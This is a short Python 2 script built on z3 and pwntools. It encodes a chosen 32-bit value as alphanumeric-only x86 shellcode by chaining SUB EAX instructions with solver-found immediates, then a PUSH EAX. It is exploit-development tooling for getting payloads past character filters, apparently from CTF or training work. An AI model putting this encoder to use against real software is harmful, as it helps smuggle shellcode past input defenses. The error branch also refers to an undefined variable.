#!/usr/bin/env python

from z3 import *
from pwn import *
import sys

ZERO_EAX = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A"
SUB = "\x2d"
PUSH_EAX = "\x50"
NOP = "\x90"

'''
Returns alphanumeric constraints based on b on solver s
'''
def add_constraint_byte(s, b):
    b_number = And(UGE(b, 0x30) , ULE(b, 0x39))
    b_uppercase = And(UGE(b, 0x41), ULE(b, 0x5A))
    b_lowercase = And(UGE(b, 0x61), ULE(b, 0x7A))

    s.add(Or(b_number, b_uppercase, b_lowercase))


'''
Takes a solver s and adds the alphanumeric conditions for the subvectors in v
'''
def add_subvector_conds(s, v):
    b1 = Extract(7, 0, v)
    add_constraint_byte(s, b1)

    b2 = Extract(15, 8, v)
    add_constraint_byte(s, b2)

    b3 = Extract(23, 16, v)
    add_constraint_byte(s, b3)

    b4 = Extract(31, 24, v)
    add_constraint_byte(s, b4)

'''
Pads bs with nops to nearest 4 byte boundary
'''
def pad(bs):
    while len(bs) % 4 != 0:
        bs = NOP + bs
    return bs

if __name__=="__main__":

    if len(sys.argv) != 2:
        print "Usage: %s <desired hex value e.g. 0x1234>" % (sys.argv[0])
        exit(-1)
    else:
        chain = ""
        a = BitVec('a', 32)
        b = BitVec('b', 32)
        c = BitVec('c', 32)
        d = BitVec('d', 32)
        target = BitVecVal(int(sys.argv[1], 16), 32)

        s = Solver()
        add_subvector_conds(s, a)
        add_subvector_conds(s, b)
        add_subvector_conds(s, c)
        add_subvector_conds(s, d)

        s.add(-a -b -c -d == target)


        if s.check() == sat:
            m = s.model()
            chain += SUB + p32(m.evaluate(a).as_long())
            chain += SUB + p32(m.evaluate(b).as_long())
            chain += SUB + p32(m.evaluate(c).as_long())
            chain += SUB + p32(m.evaluate(d).as_long())
            chain += PUSH_EAX
        else:
            print "Error occured: %s could not be encoded" % (hex(val))
            print s.check()

            #exit(-2)
            pass

    #print the chain in python bytes for easy copying
    print "\"" + "".join(["\\x" + hex(ord(c))[2:] for c in chain]) + "\""
    print "Length of shellcode: %d" % (len(chain))
